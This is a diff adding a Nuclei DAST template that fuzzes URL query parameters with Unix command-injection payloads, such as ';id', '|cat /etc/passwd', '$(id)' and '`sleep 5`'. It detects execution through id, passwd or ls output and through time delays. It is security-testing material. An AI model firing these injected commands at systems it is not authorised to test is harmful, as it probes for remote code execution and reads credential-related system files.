@@ -1,0 +1,83 @@
+id: unix-command-injection
+
+info:
+  name: Unix Command Injection - Generic Fuzz Detection
+  author: Jaenact
+  severity: high
+  description: |
+    Replaces query parameter values with command-separator payloads (e.g., ;, |, &&, backticks, $(..))
+    and detects possible OS command execution on Unix/Linux targets by matching id/whoami output,
+    /etc/passwd indicators, directory listings, or time-based delays.
+    Note: requires running nuclei with -fuzz and a target URL that includes at least one query parameter.
+  reference:
+    - https://owasp.org/www-community/attacks/Command_Injection
+    - https://cwe.mitre.org/data/definitions/78.html
+    - https://capec.mitre.org/data/definitions/88.html
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 1
+  tags: dast,injection,rce,command-injection,unix,linux,intrusive
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      unix_fuzz:
+        - ';id'
+        - '|id'
+        - '&id'
+        - '&&id'
+        - '`id`'
+        - '$(id)'
+        - ';whoami'
+        - '|whoami'
+        - '&&whoami'
+        - ';cat /etc/passwd'
+        - '|cat /etc/passwd'
+        - '&&cat /etc/passwd'
+        - ';ls -la'
+        - '|ls -la'
+        - '%0Aid'
+        - '%0Awhoami'
+        - '%0Acat%20/etc/passwd'
+        - ';sleep 5'
+        - '|sleep 5'
+        - '&&sleep 5'
+        - '`sleep 5`'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - '{{unix_fuzz}}'
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: unix-id-output
+        part: body
+        regex:
+          - '(?m)\\buid=\\d+\\([^)]+\\)\\b'
+
+      - type: regex
+        name: unix-passwd-content
+        part: body
+        regex:
+          - '(?m)^root:.*?:[0-9]+:[0-9]+:'
+
+      - type: regex
+        name: unix-ls-output
+        part: body        
+        regex:
+          - '(?m)^\\s*total\\s+\\d+\\s*$'
+
+      - type: dsl
+        name: time-based-unix
+        dsl:
+          - 'duration >= 4'
